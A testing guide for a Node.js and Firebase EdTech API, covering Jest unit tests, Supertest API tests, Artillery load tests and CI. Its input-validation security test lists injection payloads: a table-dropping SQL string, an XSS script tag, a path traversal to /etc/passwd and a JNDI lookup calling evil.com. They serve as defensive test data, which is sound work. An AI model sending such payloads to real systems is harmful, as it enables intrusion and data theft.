# Testing Guide

Comprehensive testing guide for the EdTech Platform API, covering unit tests, integration tests, and API testing.

## Table of Contents

1. [Testing Overview](#testing-overview)
2. [Test Setup](#test-setup)
3. [Unit Testing](#unit-testing)
4. [Integration Testing](#integration-testing)
5. [API Testing](#api-testing)
6. [Test Data Management](#test-data-management)
7. [Continuous Integration](#continuous-integration)
8. [Performance Testing](#performance-testing)
9. [Security Testing](#security-testing)
10. [Best Practices](#best-practices)

## Testing Overview

### Testing Strategy

Our testing approach follows the testing pyramid:
- **Unit Tests (70%)**: Fast, isolated tests for individual functions
- **Integration Tests (20%)**: Tests for component interactions
- **End-to-End Tests (10%)**: Full application workflow tests

### Testing Tools

- **Jest**: Testing framework and test runner
- **Supertest**: HTTP assertion library for API testing
- **Firebase Test SDK**: Firebase emulator testing
- **Sinon**: Mocking and stubbing library
- **Artillery**: Load testing tool
- **Postman/Newman**: API testing and automation

## Test Setup

### 1. Install Testing Dependencies

```bash
npm install --save-dev jest supertest sinon @firebase/testing
npm install --save-dev artillery newman
```

### 2. Jest Configuration

Create `jest.config.js`:
```javascript
module.exports = {
  testEnvironment: 'node',
  setupFilesAfterEnv: ['<rootDir>/tests/setup.js'],
  testMatch: [
    '<rootDir>/tests/**/*.test.js',
    '<rootDir>/tests/**/*.spec.js'
  ],
  collectCoverageFrom: [
    'routes/**/*.js',
    'middleware/**/*.js',
    'utils/**/*.js',
    '!**/node_modules/**',
    '!**/tests/**'
  ],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    }
  },
  testTimeout: 30000
};
```

### 3. Test Setup File

Create `tests/setup.js`:
```javascript
const { initializeTestApp, clearFirestoreData } = require('@firebase/testing');
const admin = require('firebase-admin');

// Test project configuration
const PROJECT_ID = 'edtech-test-project';
process.env.FIREBASE_PROJECT_ID = PROJECT_ID;
process.env.NODE_ENV = 'test';

// Initialize test Firebase app
let testApp;

beforeAll(async () => {
  testApp = initializeTestApp({
    projectId: PROJECT_ID,
    auth: { uid: 'test-admin', role: 'admin' }
  });
});

beforeEach(async () => {
  // Clear Firestore data before each test
  await clearFirestoreData({ projectId: PROJECT_ID });
});

afterAll(async () => {
  // Clean up
  if (testApp) {
    await testApp.delete();
  }
  if (admin.apps.length > 0) {
    await Promise.all(admin.apps.map(app => app.delete()));
  }
});

// Global test utilities
global.testApp = testApp;
global.PROJECT_ID = PROJECT_ID;
```

### 4. Package.json Scripts

Add to `package.json`:
```json
{
  "scripts": {
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:unit": "jest tests/unit",
    "test:integration": "jest tests/integration",
    "test:api": "jest tests/api",
    "test:load": "artillery run tests/load/load-test.yml",
    "test:postman": "newman run tests/postman/EdTech-API.postman_collection.json"
  }
}
```

## Unit Testing

### 1. Testing Utilities

Create `tests/unit/utils/emailService.test.js`:
```javascript
const EmailService = require('../../../utils/emailService');
const nodemailer = require('nodemailer');

// Mock nodemailer
jest.mock('nodemailer');

describe('EmailService', () => {
  let emailService;
  let mockTransporter;

  beforeEach(() => {
    mockTransporter = {
      sendMail: jest.fn().mockResolvedValue({ messageId: 'test-message-id' })
    };
    nodemailer.createTransport.mockReturnValue(mockTransporter);
    emailService = new EmailService();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('sendTeacherAssignmentEmail', () => {
    it('should send email successfully', async () => {
      const teacherData = {
        name: 'John Doe',
        email: 'john@example.com'
      };
      const subjectData = {
        title: 'JavaScript Basics',
        batchTitle: 'JS Batch 2024'
      };

      const result = await emailService.sendTeacherAssignmentEmail(teacherData, subjectData);

      expect(mockTransporter.sendMail).toHaveBeenCalledWith({
        from: process.env.EMAIL_USER,
        to: teacherData.email,
        subject: expect.stringContaining('Subject Assignment'),
        html: expect.stringContaining(teacherData.name)
      });
      expect(result).toEqual({ messageId: 'test-message-id' });
    });

    it('should throw error when email sending fails', async () => {
      mockTransporter.sendMail.mockRejectedValue(new Error('SMTP Error'));

      const teacherData = { name: 'John Doe', email: 'john@example.com' };
      const subjectData = { title: 'JavaScript Basics', batchTitle: 'JS Batch 2024' };

      await expect(
        emailService.sendTeacherAssignmentEmail(teacherData, subjectData)
      ).rejects.toThrow('SMTP Error');
    });
  });
});
```

### 2. Testing Middleware

Create `tests/unit/middleware/authMiddleware.test.js`:
```javascript
const { authMiddleware, requireRole } = require('../../../middleware/authMiddleware');
const admin = require('firebase-admin');

// Mock Firebase Admin
jest.mock('firebase-admin');

describe('Auth Middleware', () => {
  let req, res, next;

  beforeEach(() => {
    req = {
      headers: {},
      user: null
    };
    res = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn()
    };
    next = jest.fn();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('authMiddleware', () => {
    it('should authenticate valid token', async () => {
      const mockUser = {
        uid: 'test-uid',
        email: 'test@example.com',
        role: 'teacher'
      };

      req.headers.authorization = 'Bearer valid-token';
      admin.auth().verifyIdToken.mockResolvedValue(mockUser);
      admin.firestore().collection().doc().get.mockResolvedValue({
        exists: true,
        data: () => ({ role: 'teacher' })
      });

      await authMiddleware(req, res, next);

      expect(req.user).toEqual(expect.objectContaining(mockUser));
      expect(next).toHaveBeenCalled();
    });

    it('should reject missing authorization header', async () => {
      await authMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(401);
      expect(res.json).toHaveBeenCalledWith({
        error: 'Unauthorized',
        message: 'Authorization header is required'
      });
      expect(next).not.toHaveBeenCalled();
    });

    it('should reject invalid token format', async () => {
      req.headers.authorization = 'InvalidFormat';

      await authMiddleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(401);
      expect(res.json).toHaveBeenCalledWith({
        error: 'Unauthorized',
        message: 'Authorization header must be in format: Bearer <token>'
      });
    });
  });

  describe('requireRole', () => {
    it('should allow access for correct role', () => {
      req.user = { role: 'admin' };
      const middleware = requireRole('admin');

      middleware(req, res, next);

      expect(next).toHaveBeenCalled();
    });

    it('should deny access for incorrect role', () => {
      req.user = { role: 'teacher' };
      const middleware = requireRole('admin');

      middleware(req, res, next);

      expect(res.status).toHaveBeenCalledWith(403);
      expect(res.json).toHaveBeenCalledWith({
        error: 'Forbidden',
        message: 'Insufficient permissions. Required role: admin'
      });
    });
  });
});
```

### 3. Testing Route Handlers

Create `tests/unit/routes/admin.test.js`:
```javascript
const request = require('supertest');
const express = require('express');
const adminRoutes = require('../../../routes/admin');
const admin = require('firebase-admin');

// Mock Firebase Admin
jest.mock('firebase-admin');

const app = express();
app.use(express.json());
app.use('/api/admin', adminRoutes);

describe('Admin Routes', () => {
  beforeEach(() => {
    // Mock authenticated admin user
    jest.spyOn(require('../../../middleware/authMiddleware'), 'authMiddleware')
      .mockImplementation((req, res, next) => {
        req.user = { uid: 'admin-uid', role: 'admin' };
        next();
      });
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('POST /courses', () => {
    it('should create course successfully', async () => {
      const courseData = {
        title: 'JavaScript Fundamentals',
        category: 'Programming',
        description: 'Learn JavaScript basics'
      };

      const mockCourse = {
        id: 'course-id-123',
        ...courseData,
        createdAt: new Date(),
        createdBy: 'admin-uid'
      };

      admin.firestore().collection().add.mockResolvedValue({
        id: 'course-id-123'
      });
      admin.firestore().collection().doc().get.mockResolvedValue({
        exists: true,
        id: 'course-id-123',
        data: () => mockCourse
      });

      const response = await request(app)
        .post('/api/admin/courses')
        .send(courseData)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.title).toBe(courseData.title);
    });

    it('should validate required fields', async () => {
      const invalidData = {
        category: 'Programming'
        // Missing title
      };

      const response = await request(app)
        .post('/api/admin/courses')
        .send(invalidData)
        .expect(400);

      expect(response.body.error).toBe('ValidationError');
      expect(response.body.message).toContain('title');
    });
  });
});
```

## Integration Testing

### 1. Database Integration Tests

Create `tests/integration/database.test.js`:
```javascript
const { initializeTestApp, clearFirestoreData } = require('@firebase/testing');
const admin = require('firebase-admin');

describe('Database Integration', () => {
  let db;

  beforeAll(() => {
    db = admin.firestore();
  });

  beforeEach(async () => {
    await clearFirestoreData({ projectId: PROJECT_ID });
  });

  describe('Course Operations', () => {
    it('should create and retrieve course', async () => {
      const courseData = {
        title: 'Test Course',
        category: 'Programming',
        description: 'Test Description',
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
        createdBy: 'test-admin'
      };

      // Create course
      const docRef = await db.collection('courses').add(courseData);
      expect(docRef.id).toBeDefined();

      // Retrieve course
      const doc = await docRef.get();
      expect(doc.exists).toBe(true);
      expect(doc.data().title).toBe(courseData.title);
    });

    it('should update course', async () => {
      // Create course
      const docRef = await db.collection('courses').add({
        title: 'Original Title',
        category: 'Programming'
      });

      // Update course
      await docRef.update({
        title: 'Updated Title',
        updatedAt: admin.firestore.FieldValue.serverTimestamp()
      });

      // Verify update
      const doc = await docRef.get();
      expect(doc.data().title).toBe('Updated Title');
      expect(doc.data().updatedAt).toBeDefined();
    });
  });

  describe('Subject-Batch Relationship', () => {
    it('should maintain referential integrity', async () => {
      // Create batch
      const batchRef = await db.collection('batches').add({
        title: 'Test Batch',
        courseId: 'course-123'
      });

      // Create subject linked to batch
      const subjectRef = await db.collection('subjects').add({
        title: 'Test Subject',
        batchId: batchRef.id
      });

      // Verify relationship
      const subjectDoc = await subjectRef.get();
      expect(subjectDoc.data().batchId).toBe(batchRef.id);

      // Verify batch exists
      const batchDoc = await batchRef.get();
      expect(batchDoc.exists).toBe(true);
    });
  });
});
```

### 2. Email Service Integration

Create `tests/integration/emailService.test.js`:
```javascript
const EmailService = require('../../utils/emailService');

// Note: This test requires actual email configuration
// Use environment variables for test email account
describe('Email Service Integration', () => {
  let emailService;

  beforeAll(() => {
    // Skip if email credentials not provided
    if (!process.env.TEST_EMAIL_USER || !process.env.TEST_EMAIL_PASSWORD) {
      console.log('Skipping email integration tests - credentials not provided');
      return;
    }
    
    emailService = new EmailService();
  });

  it('should send test email', async () => {
    if (!emailService) return;

    const teacherData = {
      name: 'Test Teacher',
      email: process.env.TEST_EMAIL_RECIPIENT || 'test@example.com'
    };
    
    const subjectData = {
      title: 'Test Subject',
      batchTitle: 'Test Batch'
    };

    const result = await emailService.sendTeacherAssignmentEmail(teacherData, subjectData);
    expect(result.messageId).toBeDefined();
  }, 10000);
});
```

## API Testing

### 1. Full API Integration Tests

Create `tests/api/admin.api.test.js`:
```javascript
const request = require('supertest');
const app = require('../../server');
const admin = require('firebase-admin');

describe('Admin API Integration', () => {
  let authToken;
  let testCourseId;
  let testBatchId;

  beforeAll(async () => {
    // Create test admin token
    authToken = await admin.auth().createCustomToken('test-admin', { role: 'admin' });
  });

  beforeEach(async () => {
    // Clear test data
    await clearFirestoreData({ projectId: PROJECT_ID });
  });

  describe('Course Management Flow', () => {
    it('should complete full course management workflow', async () => {
      // 1. Create course
      const courseResponse = await request(app)
        .post('/api/admin/courses')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: 'Integration Test Course',
          category: 'Testing',
          description: 'Course for integration testing'
        })
        .expect(201);

      expect(courseResponse.body.success).toBe(true);
      testCourseId = courseResponse.body.data.courseId;

      // 2. List courses
      const listResponse = await request(app)
        .get('/api/admin/courses')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(listResponse.body.data.courses).toHaveLength(1);
      expect(listResponse.body.data.courses[0].courseId).toBe(testCourseId);

      // 3. Create batch for course
      const batchResponse = await request(app)
        .post('/api/admin/batches')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: 'Integration Test Batch',
          courseId: testCourseId,
          description: 'Batch for integration testing',
          price: 1000,
          startDate: '2024-01-15',
          status: 'published'
        })
        .expect(201);

      testBatchId = batchResponse.body.data.batchId;

      // 4. Create subject for batch
      const subjectResponse = await request(app)
        .post(`/api/admin/batches/${testBatchId}/subjects`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: 'Integration Test Subject',
          description: 'Subject for integration testing'
        })
        .expect(201);

      expect(subjectResponse.body.success).toBe(true);
      expect(subjectResponse.body.data.batchId).toBe(testBatchId);
    });
  });

  describe('Error Handling', () => {
    it('should handle unauthorized access', async () => {
      const response = await request(app)
        .post('/api/admin/courses')
        .send({ title: 'Test Course' })
        .expect(401);

      expect(response.body.error).toBe('Unauthorized');
    });

    it('should handle validation errors', async () => {
      const response = await request(app)
        .post('/api/admin/courses')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ category: 'Programming' }) // Missing title
        .expect(400);

      expect(response.body.error).toBe('ValidationError');
    });
  });
});
```

### 2. Teacher API Tests

Create `tests/api/teacher.api.test.js`:
```javascript
const request = require('supertest');
const app = require('../../server');
const admin = require('firebase-admin');

describe('Teacher API Integration', () => {
  let teacherToken;
  let testSubjectId;

  beforeAll(async () => {
    // Create test teacher token
    teacherToken = await admin.auth().createCustomToken('test-teacher', { role: 'teacher' });
  });

  beforeEach(async () => {
    // Setup test data
    const db = admin.firestore();
    
    // Create test subject assigned to teacher
    const subjectRef = await db.collection('subjects').add({
      title: 'Test Subject',
      description: 'Subject for teacher testing',
      batchId: 'test-batch-id',
      teacherId: 'test-teacher',
      teacherName: 'Test Teacher',
      teacherEmail: 'teacher@test.com',
      isActive: true,
      createdAt: admin.firestore.FieldValue.serverTimestamp()
    });
    
    testSubjectId = subjectRef.id;
  });

  describe('GET /api/teacher/my-subjects', () => {
    it('should return teacher assigned subjects', async () => {
      const response = await request(app)
        .get('/api/teacher/my-subjects')
        .set('Authorization', `Bearer ${teacherToken}`)
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.subjects).toHaveLength(1);
      expect(response.body.data.subjects[0].teacherId).toBe('test-teacher');
    });

    it('should support pagination', async () => {
      const response = await request(app)
        .get('/api/teacher/my-subjects?limit=5&offset=0')
        .set('Authorization', `Bearer ${teacherToken}`)
        .expect(200);

      expect(response.body.data.pagination).toBeDefined();
      expect(response.body.data.pagination.limit).toBe(5);
    });
  });

  describe('PUT /api/teacher/subjects/:subjectId', () => {
    it('should update subject description', async () => {
      const newDescription = 'Updated description for testing';
      
      const response = await request(app)
        .put(`/api/teacher/subjects/${testSubjectId}`)
        .set('Authorization', `Bearer ${teacherToken}`)
        .send({ description: newDescription })
        .expect(200);

      expect(response.body.success).toBe(true);
      expect(response.body.data.description).toBe(newDescription);
    });

    it('should not allow updating other teacher subjects', async () => {
      // Create subject for different teacher
      const db = admin.firestore();
      const otherSubjectRef = await db.collection('subjects').add({
        title: 'Other Teacher Subject',
        teacherId: 'other-teacher',
        isActive: true
      });

      const response = await request(app)
        .put(`/api/teacher/subjects/${otherSubjectRef.id}`)
        .set('Authorization', `Bearer ${teacherToken}`)
        .send({ description: 'Unauthorized update' })
        .expect(403);

      expect(response.body.error).toBe('Forbidden');
    });
  });
});
```

## Test Data Management

### 1. Test Data Factory

Create `tests/helpers/dataFactory.js`:
```javascript
const admin = require('firebase-admin');

class TestDataFactory {
  static async createCourse(overrides = {}) {
    const courseData = {
      title: 'Test Course',
      category: 'Programming',
      description: 'Test course description',
      thumbnailUrl: 'https://example.com/thumbnail.jpg',
      tags: ['test', 'programming'],
      isActive: true,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      createdBy: 'test-admin',
      ...overrides
    };

    const docRef = await admin.firestore().collection('courses').add(courseData);
    const doc = await docRef.get();
    
    return {
      courseId: doc.id,
      ...doc.data()
    };
  }

  static async createBatch(courseId, overrides = {}) {
    const batchData = {
      title: 'Test Batch',
      courseId,
      description: 'Test batch description',
      price: 5000,
      teachers: [],
      startDate: '2024-01-15',
      endDate: '2024-06-15',
      status: 'published',
      maxStudents: 50,
      currentStudents: 0,
      duration: '6 months',
      schedule: 'Mon-Wed-Fri 7-9 PM',
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      createdBy: 'test-admin',
      ...overrides
    };

    const docRef = await admin.firestore().collection('batches').add(batchData);
    const doc = await docRef.get();
    
    return {
      batchId: doc.id,
      ...doc.data()
    };
  }

  static async createSubject(batchId, overrides = {}) {
    const subjectData = {
      title: 'Test Subject',
      description: 'Test subject description',
      batchId,
      teacherId: null,
      teacherName: null,
      teacherEmail: null,
      isActive: true,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      createdBy: 'test-admin',
      ...overrides
    };

    const docRef = await admin.firestore().collection('subjects').add(subjectData);
    const doc = await docRef.get();
    
    return {
      subjectId: doc.id,
      ...doc.data()
    };
  }

  static async createUser(overrides = {}) {
    const userData = {
      email: 'test@example.com',
      displayName: 'Test User',
      role: 'student',
      emailVerified: true,
      disabled: false,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      ...overrides
    };

    const userRecord = await admin.auth().createUser({
      uid: userData.uid || 'test-user-' + Date.now(),
      email: userData.email,
      displayName: userData.displayName,
      emailVerified: userData.emailVerified,
      disabled: userData.disabled
    });

    // Set custom claims
    await admin.auth().setCustomUserClaims(userRecord.uid, {
      role: userData.role
    });

    return {
      uid: userRecord.uid,
      ...userData
    };
  }
}

module.exports = TestDataFactory;
```

### 2. Test Utilities

Create `tests/helpers/testUtils.js`:
```javascript
const admin = require('firebase-admin');

class TestUtils {
  static async createAuthToken(uid, customClaims = {}) {
    return await admin.auth().createCustomToken(uid, customClaims);
  }

  static async clearCollection(collectionName) {
    const db = admin.firestore();
    const batch = db.batch();
    const snapshot = await db.collection(collectionName).get();
    
    snapshot.docs.forEach(doc => {
      batch.delete(doc.ref);
    });
    
    await batch.commit();
  }

  static async waitFor(condition, timeout = 5000) {
    const start = Date.now();
    
    while (Date.now() - start < timeout) {
      if (await condition()) {
        return true;
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    throw new Error('Condition not met within timeout');
  }

  static generateRandomEmail() {
    return `test-${Date.now()}-${Math.random().toString(36).substr(2, 9)}@example.com`;
  }

  static generateRandomString(length = 10) {
    return Math.random().toString(36).substr(2, length);
  }
}

module.exports = TestUtils;
```

## Performance Testing

### 1. Load Testing with Artillery

Create `tests/load/load-test.yml`:
```yaml
config:
  target: 'http://localhost:3000'
  phases:
    - duration: 60
      arrivalRate: 5
      name: "Warm up"
    - duration: 120
      arrivalRate: 10
      name: "Ramp up load"
    - duration: 300
      arrivalRate: 20
      name: "Sustained load"
  variables:
    adminToken: "your-test-admin-token"
    teacherToken: "your-test-teacher-token"

scenarios:
  - name: "Health Check"
    weight: 20
    flow:
      - get:
          url: "/health"
          expect:
            - statusCode: 200

  - name: "Admin Course Management"
    weight: 30
    flow:
      - post:
          url: "/api/admin/courses"
          headers:
            Authorization: "Bearer {{ adminToken }}"
            Content-Type: "application/json"
          json:
            title: "Load Test Course {{ $randomString() }}"
            category: "Programming"
            description: "Course created during load testing"
          expect:
            - statusCode: 201
      - get:
          url: "/api/admin/courses"
          headers:
            Authorization: "Bearer {{ adminToken }}"
          expect:
            - statusCode: 200

  - name: "Teacher Subject Access"
    weight: 50
    flow:
      - get:
          url: "/api/teacher/my-subjects"
          headers:
            Authorization: "Bearer {{ teacherToken }}"
          expect:
            - statusCode: 200
```

### 2. Performance Test Script

Create `tests/load/performance.test.js`:
```javascript
const { performance } = require('perf_hooks');
const request = require('supertest');
const app = require('../../server');

describe('Performance Tests', () => {
  let authToken;

  beforeAll(async () => {
    authToken = 'test-token'; // Use actual test token
  });

  it('should handle concurrent requests', async () => {
    const concurrentRequests = 50;
    const requests = [];

    const startTime = performance.now();

    for (let i = 0; i < concurrentRequests; i++) {
      requests.push(
        request(app)
          .get('/health')
          .expect(200)
      );
    }

    await Promise.all(requests);
    
    const endTime = performance.now();
    const duration = endTime - startTime;
    const requestsPerSecond = (concurrentRequests / duration) * 1000;

    console.log(`Handled ${concurrentRequests} requests in ${duration.toFixed(2)}ms`);
    console.log(`Requests per second: ${requestsPerSecond.toFixed(2)}`);

    expect(requestsPerSecond).toBeGreaterThan(100); // Expect at least 100 RPS
  });

  it('should respond within acceptable time limits', async () => {
    const startTime = performance.now();
    
    await request(app)
      .get('/api/admin/courses')
      .set('Authorization', `Bearer ${authToken}`)
      .expect(200);
    
    const endTime = performance.now();
    const responseTime = endTime - startTime;

    expect(responseTime).toBeLessThan(1000); // Should respond within 1 second
  });
});
```

## Security Testing

### 1. Authentication Security Tests

Create `tests/security/auth.security.test.js`:
```javascript
const request = require('supertest');
const app = require('../../server');

describe('Authentication Security', () => {
  describe('Token Validation', () => {
    it('should reject requests without authorization header', async () => {
      await request(app)
        .get('/api/admin/courses')
        .expect(401);
    });

    it('should reject malformed authorization headers', async () => {
      const malformedHeaders = [
        'InvalidFormat',
        'Bearer',
        'Bearer ',
        'Basic dGVzdDp0ZXN0', // Basic auth instead of Bearer
        'Bearer invalid-token-format'
      ];

      for (const header of malformedHeaders) {
        await request(app)
          .get('/api/admin/courses')
          .set('Authorization', header)
          .expect(401);
      }
    });

    it('should reject expired tokens', async () => {
      const expiredToken = 'expired-token-here';
      
      await request(app)
        .get('/api/admin/courses')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);
    });
  });

  describe('Role-Based Access Control', () => {
    it('should prevent teachers from accessing admin endpoints', async () => {
      const teacherToken = 'teacher-token-here';
      
      await request(app)
        .post('/api/admin/courses')
        .set('Authorization', `Bearer ${teacherToken}`)
        .send({ title: 'Test Course' })
        .expect(403);
    });

    it('should prevent students from accessing teacher endpoints', async () => {
      const studentToken = 'student-token-here';
      
      await request(app)
        .get('/api/teacher/my-subjects')
        .set('Authorization', `Bearer ${studentToken}`)
        .expect(403);
    });
  });
});
```

### 2. Input Validation Security Tests

Create `tests/security/validation.security.test.js`:
```javascript
const request = require('supertest');
const app = require('../../server');

describe('Input Validation Security', () => {
  let adminToken;

  beforeAll(() => {
    adminToken = 'admin-token-here';
  });

  describe('SQL Injection Prevention', () => {
    it('should handle malicious input in course creation', async () => {
      const maliciousInputs = [
        "'; DROP TABLE courses; --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/admin/courses')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: input,
            category: 'Programming',
            description: 'Test'
          });

        // Should either reject (400) or sanitize the input
        expect([200, 201, 400]).toContain(response.status);
        
        if (response.status === 201) {
          // If accepted, ensure input was sanitized
          expect(response.body.data.title).not.toBe(input);
        }
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize HTML in text fields', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      
      const response = await request(app)
        .post('/api/admin/courses')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Test Course',
          category: 'Programming',
          description: xssPayload
        });

      if (response.status === 201) {
        expect(response.body.data.description).not.toContain('<script>');
      }
    });
  });

  describe('File Upload Security', () => {
    it('should reject dangerous file types', async () => {
      // Test if file upload endpoints exist and are secure
      // This is a placeholder for when file upload is implemented
      expect(true).toBe(true);
    });
  });
});
```

## Best Practices

### 1. Test Organization

- **Separate test types**: Keep unit, integration, and API tests in separate directories
- **Use descriptive names**: Test names should clearly describe what is being tested
- **Group related tests**: Use `describe` blocks to group related test cases
- **Follow AAA pattern**: Arrange, Act, Assert in each test

### 2. Test Data Management

- **Use factories**: Create test data using factory functions
- **Clean up after tests**: Always clean up test data to avoid interference
- **Use realistic data**: Test data should resemble production data
- **Avoid hardcoded values**: Use variables and generators for test data

### 3. Mocking and Stubbing

- **Mock external services**: Always mock external API calls and services
- **Use dependency injection**: Make dependencies mockable
- **Reset mocks**: Clear mocks between tests
- **Verify mock calls**: Assert that mocks were called correctly

### 4. Async Testing

- **Use async/await**: Prefer async/await over callbacks or promises
- **Set appropriate timeouts**: Increase timeout for slow operations
- **Handle errors properly**: Always handle async errors in tests
- **Wait for conditions**: Use proper waiting mechanisms for async operations

### 5. Test Coverage

- **Aim for high coverage**: Target 80%+ code coverage
- **Focus on critical paths**: Ensure important business logic is well tested
- **Test error conditions**: Don't just test happy paths
- **Monitor coverage trends**: Track coverage over time

### 6. Continuous Integration

```yaml
# .github/workflows/test.yml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v2
    
    - name: Setup Node.js
      uses: actions/setup-node@v2
      with:
        node-version: '18'
        cache: 'npm'
    
    - name: Install dependencies
      run: npm ci
    
    - name: Run unit tests
      run: npm run test:unit
    
    - name: Run integration tests
      run: npm run test:integration
      env:
        FIREBASE_PROJECT_ID: ${{ secrets.TEST_FIREBASE_PROJECT_ID }}
    
    - name: Run API tests
      run: npm run test:api
    
    - name: Generate coverage report
      run: npm run test:coverage
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v2
```

This comprehensive testing guide provides the foundation for maintaining high-quality, reliable code in the EdTech Platform API. Regular testing ensures that new features don't break existing functionality and that the application performs well under various conditions.